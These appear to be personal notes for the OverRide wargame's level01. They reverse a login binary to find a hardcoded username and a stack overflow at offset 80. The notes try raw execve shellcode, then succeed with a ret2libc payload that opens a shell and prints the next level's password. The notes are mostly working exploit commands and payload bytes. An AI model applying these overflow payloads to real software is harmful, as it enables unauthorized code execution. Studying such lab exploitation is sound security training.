
```asm
objdump -t level01 | grep bss
0804a040 g     O .bss	00000064              a_user_name

objdump -t level01 | grep text
080484d0 g     F .text	000000e6              main
08048464 g     F .text	0000003f              verify_user_name
```

```asm
disass main

 0x0804852d <+93>:	call   0x8048464 <verify_user_name>
 
 0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
```

```asm
disass verify_user_name

0x0804847d <+25>:	mov    $0x80486a8,%eax

(gdb) x/s 0x80486a8
0x80486a8:	 "dat_wil"
```

```
disass verify_user_pass

```
`cyclic 100`
```
Program received signal SIGSEGV, Segmentation fault.
0x61616175

Desktop cyclic -l 0x61616175
80
```

```asm
  0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
  0x08048585 <+181>:	mov    %eax,0x5c(%esp)
  
  b *main+181
  
  run 
  
  Enter Username: dat_wil
  Enter Password:
  AAAA
  
  x/80wx $esp
  0xffffd680:	0xffffd69c	0x00000064	0xf7fcfac0	0x00000001
  0xffffd690:	0xffffd8a1	0x0000002f	0xffffd6ec	0x41414141
```

also u can use the syntax:
`run < <(python -c 'print("dat_wil\nAAAA\n")')`
`run < <(python -c 'print("dat_wil")' && python -c 'print("AAAA")')` / `run < <(python -c 'print "dat_wil"' && python -c 'print "AAAA"')`

```py
run < <(python -c 'print "dat_will"' && python -c 'print "A" * 80 + "BBBB"')
run < <(python -c 'print "dat_will\n" + "\x90" * 59 + "C" * 21 + "BBBB"')

x $ebp+4
0xffffd6ec:	0x42424242
```
```asm
run < <(python -c 'print "dat_wil"' && python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 59 +  "\xff\xff\xd6\x9c"[::-1]')


x $ebp+4
0xffffd6ec:	0xffffd69c

x *0xffffd6ec
0xffffd69c:	0x99580b6a
```


nothing

```asm
ltrace ./level01

puts("Enter Password: "Enter Password:
)                                         = 17
fgets(AAAA
"AAAA\n", 100, 0xf7fcfac0)                                 = 0xffffd6ac


level01@OverRide:~$ (python -c 'print "dat_will"'; python -c 'print  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"  + "\x90" * 59 + "\xff\xff\xd6\xac"[::-1]'; cat -)  | ./level01

pwd
Segmentation fault (core dumped)
```



error gdb
```
process 1707 is executing new program: /bin/dash
warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
Architecture of file not recognized.
```

i will go with ret2libc
```gdb
(gdb) p &system
 0xf7e6aed0 
 
 or 
 
 (gdb) info addr system
 0xf7e6aed0 
 
(gdb) p &exit
 0xf7e5eb70 
 ```
 ```gdb
(gdb) find system, +9999999, "/bin/sh"
0xf7f897ec

or

 (gdb) info proc map
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	 0xf7e2b000 0xf7e2c000     0x1000        0x0
	 0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
```

so

payload = padding + system + return_after_system + bin_sh

`payload = "A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "AAAA" + "\xf7\xf8\x97\xec"[::-1]`

```py
level01@OverRide:~$ (python -c 'print "dat_will\n" + "A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "AAAA" + "\xf7\xf8\x97\xec"[::-1]' ; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

pwd
/home/users/level01
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
